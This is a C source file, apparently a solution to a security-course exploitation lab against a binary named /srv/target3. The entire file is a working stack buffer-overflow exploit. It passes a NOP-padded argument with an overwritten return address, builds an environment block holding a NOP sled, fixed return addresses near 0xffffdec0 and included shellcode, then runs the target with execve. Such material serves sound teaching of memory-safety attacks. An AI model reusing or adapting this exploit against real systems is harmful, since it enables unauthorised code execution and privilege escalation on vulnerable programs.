#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target3"

int main(void) {
    char *args[] = {
        TARGET,
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff",
        NULL
    };

    static char environment[400] = {0};
    uint32_t base_address = 0xffffdec0;

    // Fill the environment buffer with NOPs
    memset(environment, 0x90, sizeof(environment) - 1);

    // Adjust return address in the environment
    *((uint32_t *)(environment)) = base_address + 4;
    *((uint32_t *)(environment + 4)) = base_address + 8;

    // Copy the shellcode to a specific offset within the environment
    memcpy(environment + 201, shellcode, sizeof(shellcode));

    char *env[] = {environment};

    // Attempt to execute the target binary with the crafted arguments and environment
    execve(TARGET, args, env);

    // If execve fails, print an error message
    fprintf(stderr, "execve failed.\n");

    return 0;
}
